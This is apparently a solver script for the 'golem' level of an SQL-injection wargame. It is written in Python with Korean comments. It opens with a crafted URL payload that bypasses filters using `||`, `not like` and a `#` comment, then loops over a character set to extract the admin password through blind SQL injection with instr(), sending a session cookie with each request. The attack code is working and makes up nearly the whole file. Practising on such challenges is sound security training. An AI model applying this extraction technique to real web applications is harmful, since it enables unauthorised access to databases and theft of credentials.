#chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||length(pw)not%20like%208)%23

import requests
from dotenv import load_dotenv
import os

load_dotenv()

candidate = ['0','1','2','3','4','5','6','7','8','9',
             'a','b','c','d','e','f',
             'g','h','i','j','k','l','m',
             'n','o','p','q','r','s','t',
             'u','v','w','x','y','z',
             'A','B','C','D','E','F',
             'G','H','I','J','K','L','M',
             'N','O','P','Q','R','S','T',
             'U','V','W','X','Y','Z',
             '!', '@', '#', '$', '%', '^', '&', '*']
# all ascii
# ascii = [chr(i) for i in range(32, 127)]
# candidate = ascii
pLength = 0

#instr의 중복문제를 생각해야함

answer = ''
for i in range(0,8):
    for j in candidate:
        url=os.environ.get('LOS_URL')+'chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||instr(pw,%27'+j+'%27)%20not%20like%20'+str(i+1)+')%23'
        headers = {
            'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
        }
        res=requests.get(url, headers=headers)
        if 'Hello admin' in res.text[:200]:
            answer += j
            break
        else:
            print(j+' is not the answer')
    print(answer)

print(answer)

#guest와 admin의 pw가 같아야 성립하는 문제.
#사실 그 내용은 if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem");  에서 명시되어 있기는 함.
#하지만 php소스코드 없이 앞의 gui만 있다고 생각하면 그럭저럭 납득이 가긴 함.